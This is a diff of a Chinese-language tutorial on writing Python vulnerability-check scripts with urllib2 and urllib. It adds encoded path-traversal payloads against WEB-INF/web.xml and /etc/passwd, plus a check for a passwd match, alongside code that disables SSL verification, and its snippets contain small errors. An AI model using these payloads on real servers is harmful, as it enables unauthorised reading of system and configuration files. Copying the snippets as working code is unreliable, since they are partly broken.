@@ -599,20 +599,43 @@ logfile = time.strftime('%y_%m_%d.log', time.localtime(time.time()))
 
 实现代码示例如下：
 
-```python
+```
 import urllib2
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context  # 增加SSL认证，便于访问HTTPS网站
 ​
-url = "http://x.x.x.x:80" + "/%2e/WEB-INF/web.xml"
-req = urllib2.Request(url, headers=headers)
-resp = (urllib2.urlopen(req)).read()
+url1 = target.rstrip("/") + "/%2e/WEB-INF/web.xml"
+​
+proxy = {"http":"xxx","https":"xxx"}
+urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler(proxy)))   # 添加代理
+rep = urllib2.urlopen(urllib2.Request(url, headers=headers, data=data), timeout=10)
+# 经测试，urllib2 不能多次判断，所以需要通过赋值来进行判断
+text = rep.read()
+codes = rep.code()
+if '123' in text: # √
+if '123' in rep.read: # ×
 ```
 
-简化一下后，是这样的：
+\
 
-```python
-resp = (urllib2.urlopen(urllib2.Request(url, headers=headers)))
-text = resp.read()
-codes = resp.code
+
+**urllib 说明 对于python3 的情况**
+
+在 python3 中，已经不存在urllib2这个库了，统一为urllib，其官方文档链接为： [https://docs.python.org/3/library/urllib.html](https://docs.python.org/3/library/urllib.html)。
+
+发送请求时，如下所示即可：
+
+```
+import urllib.request
+​
+url = self.result['target'].rstrip("/") + "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+​
+req = urllib.request.urlopen(url, timeout=10)
+texts = (req.read()).decode()
+codes = req.status
+htmls = re.search(r'^root:(.*):0:0:root', texts)
+if htmls and codes == 200:
+    self.result['status'] = True
 ```
 
 ### 偶遇302
